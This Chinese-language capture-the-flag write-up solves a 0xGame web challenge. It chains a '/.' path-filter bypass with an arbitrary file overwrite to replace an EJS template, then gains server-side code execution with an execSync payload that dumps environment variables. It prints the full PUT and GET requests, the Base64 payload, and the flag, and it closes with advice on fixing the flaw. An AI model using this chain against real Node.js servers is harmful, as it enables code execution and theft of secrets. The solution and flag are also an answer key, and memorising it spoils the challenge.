# 这真的是文件上传

## 题目简述

题目提供一个 Node.js 16、Express 4 和 EJS 3.1.10 构成的文件浏览服务。应用允许客户端通过 `PUT /*` 写入 Base64 解码后的文件，并在请求路径以 `/` 结尾时调用 `res.render()` 渲染模板。附件的 Dockerfile 将 flag 放在环境变量 `FLAG` 中。

漏洞链由两个问题组成：路径过滤发生在规范化之前，可以用末尾的 `/.` 绕过 `.js` 后缀检查；上传接口既允许覆盖已有文件，也没有限制目标路径。覆盖 `views/index.ejs` 后，再触发 EJS 渲染即可在服务端执行 JavaScript 并读取环境变量。

## 解题过程

### 定位任意文件覆盖

上传接口直接将 URL 路径拼接到应用目录，并把请求体中的 `content` 作为 Base64 解码后写入：

```javascript
app.put('/*', (req, res) => {
    const filePath = path.join(STATIC_DIR, req.path);

    fs.writeFile(filePath, Buffer.from(req.body.content, 'base64'), (err) => {
        if (err) {
            return res.status(500).send('Error');
        }
        res.status(201).send('Success');
    });
});
```

过滤器拒绝以 `js` 结尾的路径和 `..`，但没有拒绝单点路径段：

```javascript
else if (/js$|\.\./i.test(req.path)) {
    res.status(403).send('Denied filename');
}
```

请求路径 `/views/index.ejs/.` 的末尾是 `/.`，因此不会命中 `js$`；随后 `path.join()` 会规范化掉表示当前目录的 `.`，实际写入位置变成 `/App/views/index.ejs`。这使攻击者能够覆盖应用原有的 EJS 模板。

### 覆盖 EJS 模板

当路径以 `/` 结尾时，应用调用 `serveIndex()`。模板白名单只包含字符串 `index`，而 `res.render('index')` 会读取默认 `views` 目录中的 `index.ejs`：

```javascript
function serveIndex(req, res) {
    const whilePath = ['index'];
    const templ = req.query.templ || 'index';

    if (!whilePath.includes(templ)) {
        return res.status(403).send('Denied Templ');
    }

    res.render(templ, {
        filenames: fs.readdirSync(path.join(__dirname, req.path)),
        path: req.path
    });
}
```

EJS 的 `<%=` 标签会求值其中的服务端 JavaScript 表达式并输出结果。Node.js 16 中可以借助 `process.mainModule.require()` 加载 `child_process`，执行 `env` 读取进程环境：

```ejs
<pre><%= process.mainModule.require('child_process').execSync('env').toString() %></pre>
```

将上述模板编码为 Base64 后，用下面的请求覆盖目标文件：

```http
PUT /views/index.ejs/. HTTP/1.1
Host: target
Content-Type: application/json

{"content":"PHByZT48JT0gcHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnZW52JykudG9TdHJpbmcoKSAlPjwvcHJlPg=="}
```

服务端返回 `201 Success` 后访问：

```http
GET /views/?templ=index HTTP/1.1
Host: target
```

应用会编译被覆盖的 `views/index.ejs`，页面中随即输出环境变量。附件 Dockerfile 中的结果为：

```text
FLAG=0xGame{Do_Not_Templ_Ejs_Injection}
```

最终 flag：

```text
0xGame{Do_Not_Templ_Ejs_Injection}
```

## 方法总结

本题不是单纯的文件上传，而是“路径规范化差异 + 任意文件覆盖 + EJS 模板执行”的组合漏洞。安全检查基于规范化前的字符串，而文件系统操作使用规范化后的路径，导致 `/.` 绕过；上传接口又允许覆盖可执行模板，最终把写文件能力升级为服务端代码执行。修复时应先解析并规范化路径，再校验其真实落点是否位于专用上传目录，同时禁止覆盖模板等可执行资源。
